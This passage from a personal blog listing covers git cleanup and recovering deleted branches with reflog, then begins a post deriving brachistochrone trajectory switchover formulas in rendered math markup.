<p>If there’s changes you’ve made to tracked files, but you want to delete
everything else (e.g. for a clean build), just run the <code class="language-plaintext highlighter-rouge">clean</code> command. To keep
new files but reset existing ones, <code class="language-plaintext highlighter-rouge">reset</code> only.</p>

<p>For more fine grained control, it depends on if the file in tracked or not.
<code class="language-plaintext highlighter-rouge">git clean</code> has the <code class="language-plaintext highlighter-rouge">-e</code> option which takes a pattern (like those in
<code class="language-plaintext highlighter-rouge">.gitignore</code>) to skip certain files. This is respected over <code class="language-plaintext highlighter-rouge">-x</code>. Tracked files
can be reset with <code class="language-plaintext highlighter-rouge">git checkout -- &lt;pathspec&gt;</code> for files and
<code class="language-plaintext highlighter-rouge">git checkout -p -- &lt;pathspec&gt;</code> for individual patches of a file.</p>

<hr />

<p>If you want to learn more about any command described here (they all have many
options not described here), check out their corresponding docs/man pages.</p>

<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:1" role="doc-endnote">

      <p>If the user has <code class="language-plaintext highlighter-rouge">clean.requireForce</code> set, a single <code class="language-plaintext highlighter-rouge">-f</code> is always required
to delete things. However, two are always needed (independent of config
options) to delete sub-repositories. <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
  </ol>
</div>
</div>
  

  <h2 class="fenced-y text-centre bleed"><a href="/posts/git-ep-deleted-ref">Git Emergency Procedures - Recovering deleted refs</a></h2>
  
    <div class="bounded"><p>Suppose you deleted a branch, or undid a merge with a now deleted branch. How do
you recover the commits? There are several things to go about this.</p>

<!--more-->

<h2 id="immediate-action"><a href="#immediate-action">Immediate Action</a></h2>

<p>This is a completely recoverable scenario, since git doesn’t immediately delete
unreferenced commits. To find the hash of the commit, you can run <code class="language-plaintext highlighter-rouge">git reflog</code>
to see the HEAD of previous commands. This allows you to find the tip of the
branch (which you would’ve been on when working on it). This is probable the
best way to find the commit you need to reference.</p>

<p>Next, to actually restore the reference, you need to make a branch pointing to
the hash: <code class="language-plaintext highlighter-rouge">git branch &lt;name&gt; &lt;hash&gt;</code>.</p>

<h2 id="possible-causes"><a href="#possible-causes">Possible Causes</a></h2>

<p>One way this can happen (as it did to me) was to:</p>
<ol>
  <li>Merge branch <code class="language-plaintext highlighter-rouge">feature</code> into <code class="language-plaintext highlighter-rouge">master</code>.</li>
  <li>Delete branch <code class="language-plaintext highlighter-rouge">feature</code>.</li>
  <li>Later, delete the merge commit (e.g. during a rebase).</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>o --- o --- o --- o --- o --- o &lt;-- master
       \               .'
        \             .'
         o --- o --- o  (feature, deleted)
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Normally, deleting the branch in step 2 is fine, since the merge still holds a
reference to the deleted branch. However, after deleting the merge commit (or
all the merged commits), nothing references the branch, and so it disappears
from history! This can be done accidentally, since there’s no warnings. However,
if the merged was a fast-forward, you’ll have to delete all the commits in the
merged branch (since the commits on <code class="language-plaintext highlighter-rouge">feature</code> are inlined into <code class="language-plaintext highlighter-rouge">master</code>).</p>

<h2 id="other-notes"><a href="#other-notes">Other Notes</a></h2>

<p>If you want to change the commit a branch is pointing to, use
<code class="language-plaintext highlighter-rouge">git reset --hard &lt;hash&gt;</code>.</p>
</div>
  

  <h2 class="fenced-y text-centre bleed"><a href="/posts/stateless-brachistochrone">Stateless Brachistochrone Trajectories</a></h2>
  
    <div class="bounded"><p>Brachistochrone trajectories are the fastest path an object in space can take
from one point to another. In terms of movement, this involves continuously
accelerating until the halfway point, and slowing down for the rest of the
journey. It’s trivial to calculate if you need to slow down if you have the
starting position; not so much if you don’t.</p>

<!--more-->

<p>The basics of how the brachistochrone trajectory works is that you only start
slowing down at the latest possible moment. The time at which you switch turns
out to be exactly halfway, since the velocity gained speeding up must equal the
velocity lost slowing down. However, without the initial position, we can still
figure this out using the current velocity and position, as well as some
algebra.</p>

<p>Let <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span></span></span></span> be our position, <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> be our velocity (both relative to the target),
<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathnormal">t</span></span></span></span> be the time until the switchover, and <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span></span></span> be our maximum acceleration.</p>

<p>To figure out <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathnormal">t</span></span></span></span>, we be a bit sneaky. We find the point where the velocity is
the same on the other side of the switchover (<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span> here), and finding the
midpoint of the distance between them. The section is effectively a
mini-brachistochrone trajectory, but with everything moving at speed <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span>.</p>

<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.24999999999999992em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><msub><mi>t</mi><mrow><mi>s</mi><mi>t</mi><mi>o</mi><mi>p</mi></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mfrac><mi>v</mi><mi>A</mi></mfrac></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mi>p</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mi>A</mi><msubsup><mi>t</mi><mrow><mi>s</mi><mi>t</mi><mi>o</mi><mi>p</mi></mrow><mn>2</mn></msubsup><mo>=</mo><mfrac><msup><mi>v</mi><mn>2</mn></msup><mrow><mn>2</mn><mi>A</mi></mrow></mfrac></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><msub><mi>x</mi><mrow><mi>s</mi><mi>w</mi><mi>i</mi><mi>t</mi><mi>c</mi><mi>h</mi></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mfrac><mrow><mi>x</mi><mo>+</mo><mi>p</mi></mrow><mn>2</mn></mfrac><mo>=</mo><mfrac><mi>x</mi><mn>2</mn></mfrac><mo>+</mo><mfrac><msup><mi>v</mi><mn>2</mn></msup><mrow><mn>4</mn><mi>A</mi></mrow></mfrac></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned}
	  t_{stop} &amp;= {v \over A}
\\	         p &amp;= {1 \over 2} A t_{stop}^2 = {v^2 \over 2A}
\\	x_{switch} &amp;= {x + p \over 2} = {x \over 2} + {v^2 \over 4A}
\end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:7.047776000000001em;vertical-align:-3.273888000000001em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.773888em;"><span style="top:-6.157436em;"><span class="pstrut" style="height:3.491108em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.28055599999999997em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">p</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.680328em;"><span class="pstrut" style="height:3.491108em;"></span><span class="mord"><span class="mord mathnormal">p</span></span></span><span style="top:-1.2032199999999995em;"><span class="pstrut" style="height:3.491108em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">c</span><span class="mord mathnormal mtight">h</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.273888000000001em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.773888em;"><span style="top:-6.157436em;"><span class="pstrut" style="height:3.491108em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.10756em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">A</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span><span style="top:-3.680328em;"><span class="pstrut" style="height:3.491108em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mord mathnormal">A</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">p</span></span></span></span><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.383108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.491108em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span><span class="mord mathnormal">A</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span><span style="top:-1.2032199999999995em;"><span class="pstrut" style="height:3.491108em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2603300000000002em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.10756em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.491108em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">4</span><span class="mord mathnormal">A</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.273888000000001em;"><span></span></span></span></span></span></span></span></span></span></span></span></p>

<p>You can just use the sign of <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mrow><mi>s</mi><mi>w</mi><mi>i</mi><mi>t</mi><mi>c</mi><mi>h</mi></mrow></msub></mrow><annotation encoding="application/x-tex">x_{switch}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">c</span><span class="mord mathnormal mtight">h</span></span></span></span></span><span class="vlist-s">&#x200b;</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> to determine if you need to boost
forward of backwards <sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote">1</a></sup>. For most cases, this is sufficient. As extra, we can
solve for <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathnormal">t</span></span></span></span> to determine how long until the switchover.</p>

<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.24999999999999992em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><msub><mi>x</mi><mrow><mi>s</mi><mi>w</mi><mi>i</mi><mi>t</mi><mi>c</mi><mi>h</mi></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mi>x</mi><mo>&#x2212;</mo><mi>v</mi><mi>t</mi><mo>&#x2212;</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mi>A</mi><msup><mi>t</mi><mn>2</mn></msup></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><msup><mi>t</mi><mn>2</mn></msup><mo stretchy="false">(</mo><mfrac><mi>A</mi><mn>2</mn></mfrac><mo stretchy="false">)</mo><mo>+</mo><mi>t</mi><mo stretchy="false">(</mo><mi>v</mi><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><msub><mi>x</mi><mrow><mi>s</mi><mi>w</mi><mi>i</mi><mi>t</mi><mi>c</mi><mi>h</mi></mrow></msub><mo>&#x2212;</mo><mi>x</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mi>t</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mfrac><mrow><mo>&#x2212;</mo><mi>v</mi><mo>&#xb1;</mo><msqrt><mrow><msup><mi>v</mi><mn>2</mn></msup><mo>&#x2212;</mo><mn>2</mn><mi>A</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mrow><mi>s</mi><mi>w</mi><mi>i</mi><mi>t</mi><mi>c</mi><mi>h</mi></mrow></msub><mo>&#x2212;</mo><mi>x</mi><mo stretchy="false">)</mo></mrow></msqrt></mrow><mi>A</mi></mfrac></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mi>t</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mfrac><mrow><mo>&#x2212;</mo><mi>v</mi><mo>&#xb1;</mo><msqrt><mrow><mfrac><msup><mi>v</mi><mn>2</mn></msup><mn>2</mn></mfrac><mo>+</mo><mi>A</mi><mi>x</mi></mrow></msqrt></mrow><mi>A</mi></mfrac></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned}
	x_{switch} &amp;= x - vt - {1 \over 2} At^2
\\	0 &amp;= t^2({A \over 2}) + t(v) + (x_{switch} - x)
\\	t &amp;= \frac{-v \pm \sqrt{v^2 - 2A(x_{switch} - x)}} {A}
\\	t &amp;= \frac{-v \pm \sqrt{ {v^2 \over 2} + Ax }} {A}
\end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:10.485769999999999em;vertical-align:-4.992884999999999em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:5.492885em;"><span style="top:-8.401445em;"><span class="pstrut" style="height:4.23em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">c</span><span class="mord mathnormal mtight">h</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-6.055115000000001em;"><span class="pstrut" style="height:4.23em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.4391150000000015em;"><span class="pstrut" style="height:4.23em;"></span><span class="mord"><span class="mord mathnormal">t</span></span></span><span style="top:-0.22311500000000117em;"><span class="pstrut" style="height:4.23em;"></span><span class="mord"><span class="mord mathnormal">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:4.992884999999999em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:5.492885em;"><span style="top:-8.401445em;"><span class="pstrut" style="height:4.23em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mord mathnormal">A</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-6.055115000000001em;"><span class="pstrut" style="height:4.23em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.36033em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">t</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">c</span><span class="mord mathnormal mtight">h</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span><span style="top:-3.4391150000000015em;"><span class="pstrut" style="height:4.23em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.63em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">A</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.6950000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">±</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.935em;"><span class="svg-align" style="top:-3.2em;"><span class="pstrut" style="height:3.2em;"></span><span class="mord" style="padding-left:1em;"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span 